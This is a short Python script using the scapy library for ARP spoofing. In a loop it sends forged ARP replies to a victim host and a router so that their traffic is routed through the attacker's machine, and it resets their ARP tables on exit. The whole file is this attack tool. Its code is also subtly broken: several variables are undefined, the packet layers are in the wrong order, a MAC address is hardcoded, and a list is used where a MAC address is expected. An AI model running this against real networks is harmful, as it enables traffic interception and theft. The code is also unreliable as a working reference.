#!/usr/bin/python
import time
from scapy import all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broad = arp_request/broadcast
    answered = scapy.srp(arp_request_broad, timeout=1, verbose=False)[0]
    answered[0][1].hwsrc
    c_list = []
    for each_answered in answered:
        dict = {"IP": each_answered[1].psrc, "MAC": each_answered[1].hwsrc}
        c_list.append(dict)
    return c_list

def spoof(victim_ip, spoof_ip):
    targ_mac = get_mac(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst="08:00:27:1c:b8:4f", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_hw = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_hw, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

counter = 0
try:
    while True:
        spoof(ip_victim, router)  # change this
        spoof(router, ip_victim)  # change this
        counter += 2
        print(f"\r[+] Packages sent: {counter}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Exiting program...Reseting tables...")
    restore(victim_ip, router)  # change this
    restore(router, victim_ip)  # change this
